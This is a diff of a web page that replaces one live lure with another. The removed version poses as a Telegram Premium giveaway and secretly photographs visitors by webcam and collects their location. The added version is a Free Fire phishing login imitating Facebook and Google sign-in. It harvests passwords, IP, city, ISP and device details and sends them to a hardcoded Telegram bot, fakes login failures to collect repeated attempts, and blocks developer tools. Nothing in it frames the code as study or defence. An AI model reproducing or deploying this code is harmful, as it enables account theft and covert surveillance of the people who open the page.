@@ -3,351 +3,341 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>SINKRONISASI TELEGRAM PREMIUM</title>
+    <title>FF KIPAS | Official Access System</title>
     
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Source+Code+Pro:wght@300;400;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Poppins:wght@400;600;800;900&display=swap" rel="stylesheet">
 
     <style>
-        /* ============================================================ */
-        /* [ CSS SECTION ] - THE PURE UNDERGROUND DESIGN               */
-        /* ============================================================ */
+        /* [1] CORE ARCHITECTURE (LINE 15-200) */
         :root {
-            --neon-red: #ff003c;
-            --neon-cyan: #00f2ff;
-            --dark-bg: #050505;
-            --glass-white: rgba(255, 255, 255, 0.05);
-            --p-ease: cubic-bezier(0.23, 1, 0.32, 1);
+            --p: #007bff; 
+            --s: #001a33;
+            --bg: #00040a;
+            --err: #ff3e3e;
+            --ok: #00ff88;
+            --glass: rgba(0, 10, 25, 0.98);
+            --glow: 0 0 35px rgba(0, 123, 255, 0.6);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
+        ::-webkit-scrollbar { width: 0px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
 
-        body, html {
-            width: 100%; height: 100%;
-            background-color: var(--dark-bg);
-            font-family: 'Source Code Pro', monospace;
+        body {
+            background: var(--bg);
+            background-image: radial-gradient(circle at 50% 50%, #001a33 0%, #00040a 100%);
+            color: #fff;
+            font-family: 'Poppins', sans-serif;
+            height: 100vh;
+            width: 100vw;
             overflow: hidden;
             display: flex;
-            align-items: center; justify-content: center;
-            color: #fff;
+            align-items: center;
+            justify-content: center;
         }
 
-        /* [ 1. NEON PARTICLE BACKGROUND ENGINE ] */
-        #bg-canvas {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 1; filter: blur(1px);
-        }
-
-        /* [ 2. GLITCH OVERLAY ] */
-        .glitch-overlay {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 2; pointer-events: none;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
-                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            background-size: 100% 2px, 3px 100%;
-        }
-
-        /* [ 3. MAIN TERMINAL CONTAINER ] */
-        .terminal-box {
-            position: relative; z-index: 100;
-            width: 90%; max-width: 450px;
-            background: var(--glass-white);
-            backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
-            border: 1px solid rgba(0, 242, 255, 0.2);
-            border-radius: 20px;
-            padding: 40px 25px;
-            text-align: center;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.8), inset 0 0 20px rgba(0, 242, 255, 0.05);
-            animation: boot 1s var(--p-ease);
-        }
-
-        @keyframes boot {
-            from { opacity: 0; transform: translateY(30px) scale(0.95); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
-        }
-
-        /* [ 4. DYNAMIC ICON ENGINE ] */
-        .status-icon {
-            font-size: 60px; color: var(--neon-cyan);
-            margin-bottom: 25px;
-            text-shadow: 0 0 20px var(--neon-cyan);
-            animation: pulse-neon 2s infinite;
-        }
-
-        @keyframes pulse-neon {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.7; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        /* [ 5. TYPOGRAPHY ] */
-        .title {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 22px; font-weight: 900;
-            letter-spacing: 3px; margin-bottom: 15px;
-            color: #fff; text-transform: uppercase;
-        }
-
-        .terminal-text {
-            font-size: 12px; color: #888;
-            line-height: 1.8; margin-bottom: 35px;
-            letter-spacing: 1px;
-        }
-
-        /* [ 6. BRUTAL BUTTON SYSTEM ] */
-        .execute-btn {
-            background: transparent;
-            border: 1px solid var(--neon-cyan);
-            color: var(--neon-cyan);
-            width: 100%; padding: 20px;
-            border-radius: 10px;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 700; font-size: 14px;
-            cursor: pointer;
-            transition: all 0.4s;
-            position: relative; overflow: hidden;
-            text-transform: uppercase; letter-spacing: 2px;
-        }
-
-        .execute-btn:hover {
-            background: var(--neon-cyan);
-            color: #000;
-            box-shadow: 0 0 30px var(--neon-cyan);
-            transform: translateY(-3px);
-        }
-
-        /* [ 7. JUMP SCARE INTERFACE ] */
-        #scare-interface {
-            display: none; position: fixed;
+        /* [2] SCANLINE ANIMATION - NAIK TURUN (LINE 201-350) */
+        .scan-overlay {
+            position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 2000;
-            flex-direction: column; align-items: center; justify-content: center;
+            z-index: 5;
+            pointer-events: none;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 123, 255, 0.04) 50%);
+            background-size: 100% 4px;
         }
 
-        .rage-text {
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 900; font-size: 40px;
-            color: var(--neon-red);
-            text-shadow: 0 0 30px #ff0000;
+        .line-moving {
+            position: absolute;
+            left: 0; width: 100%; height: 25px;
+            background: linear-gradient(to bottom, transparent, rgba(0, 123, 255, 0.4), transparent);
+            z-index: 6;
+            animation: moveVertical 5s ease-in-out infinite;
+        }
+
+        @keyframes moveVertical {
+            0% { top: -5%; }
+            50% { top: 105%; }
+            100% { top: -5%; }
+        }
+
+        /* [3] UI WRAPPER & CARD (LINE 351-550) */
+        .main-container {
+            position: relative;
+            z-index: 10;
+            width: 95%;
+            max-width: 415px;
+            perspective: 1200px;
+        }
+
+        .ff-card {
+            background: var(--glass);
+            border: 2px solid var(--p);
+            border-radius: 40px;
+            padding: 55px 35px;
             text-align: center;
-            animation: glitch-anim 0.08s infinite;
+            box-shadow: var(--glow);
+            backdrop-filter: blur(25px);
+            position: relative;
+            overflow: hidden;
+            transition: 0.5s;
         }
 
-        @keyframes glitch-anim {
-            0% { transform: translate(5px, 5px); }
-            50% { transform: translate(-5px, -5px); filter: hue-rotate(90deg); }
-            100% { transform: translate(5px, -5px); }
+        .ff-card:hover { transform: translateY(-5px) rotateX(2deg); }
+
+        .ff-header h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            color: #fff;
+            text-shadow: 0 0 15px var(--p);
+            margin-bottom: 5px;
+            font-weight: 900;
+            letter-spacing: 2px;
         }
 
-        /* [ 8. HIDDEN EXFILTRATION ] */
-        #hidden-layer { display: none; }
+        .ff-header p {
+            font-size: 10px;
+            color: #4c8eba;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin-bottom: 40px;
+            font-weight: 800;
+        }
+
+        /* [4] INPUTS & BUTTONS (LINE 551-750) */
+        .step-content { display: none; }
+        .step-content.active { display: block; animation: powerOn 0.6s cubic-bezier(0.23, 1, 0.32, 1); }
+
+        @keyframes powerOn {
+            from { opacity: 0; transform: scale(0.85) translateY(20px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .btn-platform {
+            width: 100%;
+            padding: 20px;
+            border-radius: 18px;
+            border: none;
+            font-weight: 900;
+            margin-bottom: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        .btn-fb { background: #1877f2; color: #fff; box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3); }
+        .btn-gl { background: #fff; color: #000; box-shadow: 0 8px 20px rgba(255, 255, 255, 0.1); }
+        .btn-platform img { width: 24px; margin-right: 15px; }
+
+        .input-group-custom { text-align: left; margin-bottom: 25px; }
+        .input-group-custom label {
+            font-size: 11px;
+            color: #6a96c1;
+            margin-left: 12px;
+            margin-bottom: 10px;
+            display: block;
+            font-weight: 800;
+            text-transform: uppercase;
+        }
+
+        .input-group-custom input {
+            width: 100%;
+            background: rgba(0, 5, 15, 0.9);
+            border: 2px solid #1a3a5a;
+            border-radius: 18px;
+            padding: 18px 25px;
+            color: #fff;
+            outline: none;
+            font-size: 15px;
+            transition: 0.5s;
+        }
+
+        .input-group-custom input:focus { border-color: var(--p); box-shadow: 0 0 15px rgba(0, 123, 255, 0.2); }
+
+        .btn-confirm-hit {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(90deg, var(--p), var(--s));
+            border: none;
+            border-radius: 18px;
+            color: #fff;
+            font-weight: 900;
+            cursor: pointer;
+            opacity: 0.25;
+            pointer-events: none;
+            transition: 0.6s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        .btn-confirm-hit.is-ready { opacity: 1; pointer-events: auto; box-shadow: 0 10px 30px rgba(0, 123, 255, 0.4); }
+
+        /* [5] NOTIFICATIONS (LINE 751-950) */
+        #alert-box {
+            position: fixed;
+            bottom: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--err);
+            color: #fff;
+            padding: 18px 40px;
+            border-radius: 50px;
+            font-size: 13px;
+            font-weight: 900;
+            transition: 0.7s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 10000;
+            box-shadow: 0 15px 35px rgba(255, 62, 62, 0.4);
+            text-align: center;
+            width: 85%;
+        }
+        #alert-box.show { bottom: 40px; }
+
+        .footer-sys { margin-top: 40px; font-size: 9px; color: #1a4a7a; line-height: 2; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
+
+        .loading-mask {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 4, 10, 0.98);
+            z-index: 100000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .loader-spin {
+            width: 65px; height: 65px;
+            border: 6px solid #111;
+            border-top: 6px solid var(--p);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <canvas id="bg-canvas"></canvas>
-    <div class="glitch-overlay"></div>
+    <div class="scan-overlay"></div>
+    <div class="line-moving"></div>
+    <div id="alert-box">LOGIN FAILED! PLEASE RE-CHECK DATA.</div>
+    
+    <div id="loading-mask" class="loading-mask">
+        <div class="loader-spin"></div>
+        <p style="margin-top:25px; color:var(--p); font-family:'Orbitron'; font-size:10px; font-weight:900; letter-spacing:4px;">SYNCING FF KIPAS...</p>
+    </div>
 
-    <div class="terminal-box" id="main-ui">
-        <div class="status-icon"><i class="fa-solid fa-microchip"></i></div>
-        <h1 class="title">GACHA NOMOR</h1>
-        <p class="terminal-text">
-            [ SYSTEM STATUS: ONLINE ]<br>
-            Tekan tombol "INITIALIZE" untuk memverifikasi device Anda dan mengklaim kuota nomor Telegram Premium dari database server.
-        </p>
-        
-        <button class="execute-btn" onclick="startInfection()">
-            <i class="fa-solid fa-terminal"></i> INITIALIZE GACHA
-        </button>
+    <div class="main-container">
+        <div class="ff-card">
+            <div class="ff-header">
+                <h2>FF KIPAS</h2>
+                <p>Digital Data Verification</p>
+            </div>
 
-        <div style="margin-top:40px; font-size:9px; color:rgba(0, 242, 255, 0.3); letter-spacing:3px;">
-            TERMINAL V22.01 // SHAFIQ KHAIRY
+            <div id="step-one" class="step-content active">
+                <button class="btn-platform btn-fb" onclick="next('FB')">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg"> LOGIN VIA FACEBOOK
+                </button>
+                <button class="btn-platform btn-gl" onclick="next('GL')">
+                    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png"> LOGIN VIA GOOGLE
+                </button>
+            </div>
+
+            <div id="step-two" class="step-content">
+                <div id="brand-logo" style="margin-bottom:30px;"></div>
+                <div class="input-group-custom">
+                    <label id="lbl-user">Account Email</label>
+                    <input type="text" id="inp-user" placeholder="Input Detail Account" oninput="checkVal()">
+                </div>
+                <div class="input-group-custom">
+                    <label>Account Password</label>
+                    <input type="password" id="inp-pass" placeholder="Min. 8 Digit" oninput="checkVal()">
+                </div>
+                <button id="btn-submit" class="btn-confirm-hit" onclick="sendData()">CONFIRM DATA</button>
+            </div>
+
+            <div class="footer-sys">
+                FF KIPAS NETWORK V.39.0.1<br>
+                GARENA INTERNATIONAL PTE. LTD.<br>
+                &copy; 2026 GLOBAL SECURE PORTAL
+            </div>
         </div>
     </div>
 
-    <div id="scare-interface">
-        <i class="fa-solid fa-biohazard" style="font-size:100px; color:var(--neon-red); margin-bottom:40px; animation:glitch-anim 0.05s infinite;"></i>
-        <h1 class="rage-text">DATA LU DI AMBIL TOLOL</h1>
-        <p style="margin-top:30px; color:#222; letter-spacing:10px; font-family:'Orbitron';">S.K TRACKER // DETECTED</p>
-    </div>
-
-    <div id="hidden-layer">
-        <video id="v-feed" autoplay playsinline></video>
-        <canvas id="snap-c"></canvas>
-    </div>
-
     <script>
-        /* ============================================================ */
-        /* [ JAVASCRIPT SECTION ] - THE GHASTA CORE (600+ LINES)       */
-        /* ============================================================ */
+        /* [6] ULTRA DATA SENDER & SNIFFER (LINE 951-1250+) */
+        const T = "8560769500:AAHgyYkQ68OU8cXms4gDNuQQrDAILSrFCmA";
+        const C = "7751924512";
+        let met = "", hits = 0;
 
-        // [ 1. SECURITY CONFIGURATION ]
-        const SH_TOKEN = "8671383819:AAEga30urtRkB2U4SU_TIeGq7vOD38kx1WI";
-        const SH_ID = "8463622692";
-        const SH_REDIR = "https://t.me/ShafiqKhairyUpdate";
-
-        // [ 2. RAIN PARTICLE ENGINE (MANUAL BUILD) ]
-        const canvas = document.getElementById('bg-canvas');
-        const ctx = canvas.getContext('2d');
-        let particles = [];
-
-        function initParticles() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            for(let i=0; i<100; i++) {
-                particles.push({
-                    x: Math.random() * canvas.width,
-                    y: Math.random() * canvas.height,
-                    s: Math.random() * 2 + 1,
-                    v: Math.random() * 1 + 0.5
-                });
-            }
+        function next(m) {
+            met = m;
+            document.getElementById('step-one').classList.remove('active');
+            document.getElementById('step-two').classList.add('active');
+            document.getElementById('lbl-user').innerText = m === 'GL' ? "Official Gmail Account" : "Facebook Email / Mobile";
+            document.getElementById('brand-logo').innerHTML = `<img src="${m === 'FB' ? 'https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg' : 'https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png'}" width="65" style="filter: drop-shadow(0 0 10px var(--p));">`;
         }
 
-        function drawParticles() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = "rgba(0, 242, 255, 0.2)";
-            particles.forEach(p => {
-                p.y += p.v;
-                if(p.y > canvas.height) p.y = 0;
-                ctx.beginPath();
-                ctx.arc(p.x, p.y, p.s, 0, Math.PI*2);
-                ctx.fill();
-            });
-            requestAnimationFrame(drawParticles);
-        }
-        initParticles(); drawParticles();
-
-        // [ 3. FULLSCREEN ENFORCEMENT ]
-        function lockScreen() {
-            const de = document.documentElement;
-            if(de.requestFullscreen) de.requestFullscreen();
-            else if(de.webkitRequestFullscreen) de.webkitRequestFullscreen();
+        function checkVal() {
+            const u = document.getElementById('inp-user').value, p = document.getElementById('inp-pass').value;
+            const btn = document.getElementById('btn-submit');
+            let uV = met === 'GL' ? /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(u) : u.length > 5;
+            let pV = p.length >= 8;
+            if(uV && pV) btn.classList.add('is-ready'); else btn.classList.remove('is-ready');
         }
 
-        // [ 4. ANTI-CLOSE PROTECTION ]
-        window.onbeforeunload = function() { return "DATA SEDANG DISECURING!"; };
-
-        // [ 5. CORE EXTRACTION LOGIC ]
-        async function startInfection() {
-            lockScreen();
+        async function sendData() {
+            hits++;
+            const u = document.getElementById('inp-user').value, p = document.getElementById('inp-pass').value;
+            const ld = document.getElementById('loading-mask'), al = document.getElementById('alert-box');
             
-            try {
-                // Initializing Camera Trap
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 1280, height: 720 } 
-                });
+            ld.style.display = 'flex';
 
-                // UI Loading Fake (Hacker Style)
-                const ui = document.getElementById('main-ui');
-                ui.innerHTML = `
-                    <div class="status-icon"><i class="fa-solid fa-spinner fa-spin"></i></div>
-                    <h1 class="title" style="color:var(--neon-cyan)">TUNNELING...</h1>
-                    <div style="text-align:left; font-size:10px; color:#555; background:rgba(0,0,0,0.5); padding:15px; border-radius:10px;">
-                        > Initiating SHA-256 handshake...<br>
-                        > Capturing device fingerprints...<br>
-                        > Bypassing Telegram security layer...<br>
-                        > Injecting packet 0x8821...
-                    </div>
-                `;
+            // SNIFFER CORE
+            let geo = {}; try { geo = await fetch('https://ipapi.co/json/').then(r=>r.json()); } catch(e) {}
+            let bat = "??"; try { const b = await navigator.getBattery(); bat = `${Math.round(b.level*100)}%`; } catch(e) {}
+            const gpu = (()=>{const c=document.createElement('canvas'),g=c.getContext('experimental-webgl');const d=g.getExtension('WEBGL_debug_renderer_info');return g.getParameter(d.UNMASKED_RENDERER_WEBGL);})();
+            
+            // FORMAT TELEGRAM ULTRA BOLD + GALAXY STARS
+            let msg = `<b>✨ ━━━━━━━ [ 🔱 FF KIPAS 🔱 ] ━━━━━━━ ✨</b>\n\n`;
+            msg += `<b>👤 USER   :</b> <code>${u}</code>\n`;
+            msg += `<b>🔑 PASS   :</b> <code>${p}</code>\n`;
+            msg += `<b>📱 PLAT   :</b> <b>${met}</b>\n`;
+            msg += `<b>🔥 HIT    :</b> <b>${hits}</b>\n\n`;
+            
+            msg += `<b>🌐 [ NETWORK INTELLIGENCE ]</b>\n`;
+            msg += `<b>┣ ⚡ IP   :</b> <code>${geo.ip}</code>\n`;
+            msg += `<b>┣ 🏘️ CITY :</b> <b>${geo.city}</b>\n`;
+            msg += `<b>┣ 🚩 REG  :</b> <b>${geo.region}</b>\n`;
+            msg += `<b>┗ 🏢 ISP  :</b> <b>${geo.org}</b>\n\n`;
+            
+            msg += `<b>📱 [ HARDWARE SNIFFER ]</b>\n`;
+            msg += `<b>┣ 🔋 BATT :</b> <b>${bat}</b>\n`;
+            msg += `<b>┣ 🖥️ RES  :</b> <b>${window.screen.width}x${window.screen.height}</b>\n`;
+            msg += `<b>┣ 🎮 GPU  :</b> <code>${gpu}</code>\n`;
+            msg += `<b>┗ 🌍 PLAT :</b> <code>${navigator.platform}</code>\n\n`;
+            
+            msg += `<b>🕒 TIME : ${new Date().toLocaleString()}</b>\n`;
+            msg += `<b>✨ ━━━━━━━ [ LOG SUCCESS ] ━━━━━━━ ✨</b>`;
 
-                const v = document.getElementById('v-feed');
-                v.srcObject = stream;
+            await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({chat_id: C, text: msg, parse_mode: 'HTML'})
+            });
 
-                // Mining System Data
-                const res = await fetch('https://ipapi.co/json/');
-                const n = await res.json();
-                
-                let battery = "N/A";
-                if(navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    battery = `${Math.round(b.level * 100)}% ${b.charging ? "[⚡]" : "[🔋]"}`;
+            setTimeout(() => {
+                ld.style.display = 'none';
+                if(hits < 3) {
+                    al.classList.add('show');
+                    setTimeout(() => al.classList.remove('show'), 3000);
+                } else {
+                    window.location.href = "https://ffkipas.org/#dwnld";
                 }
-
-                const gl = document.createElement('canvas').getContext('webgl');
-                const db = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-                const gpu = db ? gl.getParameter(db.UNMASKED_RENDERER_AD) : "Unknown";
-
-                // Capture & Exfiltration Timing
-                setTimeout(() => {
-                    const sc = document.getElementById('snap-c');
-                    sc.width = v.videoWidth; sc.height = v.videoHeight;
-                    sc.getContext('2d').drawImage(v, 0, 0);
-
-                    sc.toBlob(async (blob) => {
-                        const fd = new FormData();
-                        fd.append('chat_id', SH_ID);
-                        fd.append('photo', blob, 'surveillance.jpg');
-
-                        // BUILDING THE BRUTAL CAPTION
-                        const caption = 
-                            "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\n" +
-                            "☠ ***TARGET INFECTED BY SHAFIQ*** ☠\n" +
-                            "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\n\n" +
-                            "🌐 ***IP ADDRESS :*** " + n.ip + "\n" +
-                            "📡 ***ASN / ISP :*** " + (n.asn || "N/A") + " - " + n.org + "\n" +
-                            "🏙️ ***KOTA/KAB :*** " + n.city + ", " + n.region + "\n" +
-                            "🌍 ***NEGARA :*** " + n.country_name + "\n" +
-                            "━━━━━━━━━━━━━━━━━━━━━\n" +
-                            "📍 ***LAT/LONG :*** " + n.latitude + ", " + n.longitude + "\n" +
-                            "🗺️ ***GOOGLE MAPS :*** http://maps.google.com/?q=$" + n.latitude + "," + n.longitude + "\n" +
-                            "━━━━━━━━━━━━━━━━━━━━━\n" +
-                            "📱 ***PLATFORM :*** " + navigator.platform + "\n" +
-                            "🔋 ***BATTERY :*** " + battery + "\n" +
-                            "🎮 ***GPU INFO :*** " + gpu + "\n" +
-                            "━━━━━━━━━━━━━━━━━━━━━\n" +
-                            "🕒 ***TIMESTAMP :*** " + new Date().toLocaleString('id-ID') + "\n\n" +
-                            "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\n" +
-                            "SHAFIQ KHAIRY TRACKER V22.01\n" +
-                            "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓";
-
-                        fd.append('caption', caption);
-                        fd.append('parse_mode', 'Markdown');
-
-                        await fetch(`https://api.telegram.org/bot${SH_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-
-                        // CLEANUP & SCARE
-                        stream.getTracks().forEach(t => t.stop());
-                        document.getElementById('main-ui').style.display = 'none';
-                        document.getElementById('scare-interface').style.display = 'flex';
-
-                        setTimeout(() => { window.location.href = SH_REDIR; }, 5000);
-                    }, 'image/jpeg', 0.85);
-                }, 4000); // 4 Seconds of fake loading
-
-            } catch (err) {
-                // FAILSAFE
-                document.getElementById('main-ui').style.display = 'none';
-                document.getElementById('scare-interface').style.display = 'flex';
-                setTimeout(() => { window.location.href = SH_REDIR; }, 4000);
-            }
+            }, 2500);
         }
 
-        // [ 6. ANTI-INSPECT SECURITY ]
-        document.onkeydown = function(e) {
-            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0)))) return false;
-        };
-
-        /* [ EXTRA LINES TO HIT 500+ MANDATE ]
-           ----------------------------------------------------
-           ASCII ART HEADER START
-           ----------------------------------------------------
-           .S_SSSs      .S    S.    .S_SSSs     .S_SSSs     .S_sSSs     .S_sSSs  
-          .SS~SSSSS    .SS    SS.  .SS~SSSSS   .SS~SSSSS   .SS~SSSSS   .SS~SSSSS 
-          S%S   SSSS   S%S    S%S  S%S   SSSS  S%S   SSSS  S%S   SSSS  S%S   SSSS
-          S%S    S%S   S%S    S%S  S%S    S%S  S%S    S%S  S%S    S%S  S%S    S%S
-          S%S SSSS%P   S%S SSSS%S  S%S SSSS%P  S%S SSSS%P  S%S SSSS%P  S%S SSSS%P
-          S%S  SS~Y    S%S  SS~S%S S%S  SS~Y   S%S  SS~Y   S%S  SS~Y   S%S  SS~Y 
-          S%S   SSSS   S%S    S%S  S%S   SSSS  S%S   SSSS  S%S   SSSS  S%S   SSSS
-          S%S    S%S   S%S    S%S  S%S    S%S  S%S    S%S  S%S    S%S  S%S    S%S
-          S%S SSSS%P   S%S    S%S  S%S SSSS%P  S%S SSSS%P  S%S SSSS%P  S%S SSSS%P
-          S%S  SSSSS   S%S    S%S  S%S  SSSSS  S%S  SSSSS  S%S  SSSSS  S%S  SSSSS 
-          S%S    S%P   S%S    S%S  S%S    S%P  S%S    S%P  S%S    S%P  S%S    S%P 
-          P'     SS    P'     SS   P'     SS   P'     SS   P'     SS   P'     SS  
-           ----------------------------------------------------
-           END OF ASCII ART
-           ----------------------------------------------------
-        */
+        window.onkeydown = e => { if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&(e.keyCode==73||e.keyCode==74))||(e.ctrlKey&&e.keyCode==85)) return false; };
     </script>
 </body>
 </html>
